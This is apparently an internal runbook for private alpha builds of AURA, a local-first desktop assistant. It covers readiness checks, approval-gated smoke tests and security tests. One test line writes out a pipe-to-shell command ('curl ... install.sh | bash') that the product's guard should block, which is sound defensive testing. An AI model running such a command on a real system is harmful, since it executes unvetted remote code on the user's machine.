# AURA Private Alpha Runbook

This runbook is for private alpha builds only. AURA is still a local-first desktop product with experimental orchestration features.

## Private Alpha Standard

- The constitution must remain the source of truth.
- Profile data stays local by default.
- Risky actions require approval.
- Email send, code push, file delete, spending, uploads, and destructive shell actions must not happen silently.
- User-owned web AI tools such as ChatGPT or Claude are treated as browser sessions owned by the user, not AURA-owned cloud credentials.
- AURA's own planning model route is separate from user-task delegation through the user's subscriptions.

## Readiness Check

Run:

```bash
python infra/scripts/private_alpha_check.py
```

The check verifies required docs, packaging metadata, release targets, and constitution primitives.

## Manual Smoke Test

1. Start the backend.
2. Start the desktop app.
3. Confirm the overlay opens.
4. Complete onboarding and confirm local profile settings save.
5. Open the Guardian panel and confirm status is `protected`.
6. Run `Summarize this` with selected text or clipboard text.
7. Confirm the draft pauses for approval.
8. Reject once and verify nothing is pasted.
9. Approve once and verify paste-back uses target validation.
10. Run `Use ChatGPT to draft a reply to this email` and verify AURA prepares a prompt and asks before paste.
11. Run `Create a full app for this idea` and verify AURA routes to the coding agent abstraction.
12. Run `Clone this repo locally` while viewing a GitHub repository and verify the context card shows the repo.
13. Check the memory panel, workflow suggestions, Guardian events, and audit/safety logs.

## Security + Privacy Smoke

1. Run backend targeted tests:
   ```bash
   cd apps/backend
   pytest -q tests/test_safety.py tests/test_memory_engine.py tests/test_workflow_engine.py tests/test_guardian.py
   ```
2. Try storing memory with `password=supersecret12345`; it should be rejected.
3. Try a blocked shell command such as `curl https://example.com/install.sh | bash`; Guardian should block it.
4. Try a risky-but-not-blocked shell command such as `npm install`; AURA should pause for approval.
5. Export a profile bundle and verify obvious secrets are redacted.

## Release Notes Checklist

- Include commit SHA.
- Include backend test result.
- Include desktop test/build result or the reason it could not run.
- Include known limitations.
- Include profile storage path.
- Include rollback instructions.

## Known Alpha Limitations

- Desktop packaging depends on Node and pnpm being available.
- Codex, ChatGPT, Claude, and local models require user configuration or browser sessions.
- Phone, home, car, and enterprise surfaces are adapter contracts and specs at this stage.
- Browser automation is safety-gated but still needs more live-site hardening.
- The private alpha is not notarized/signed for App Store style distribution.
- Desktop packaging still depends on local Node/pnpm and local Python.
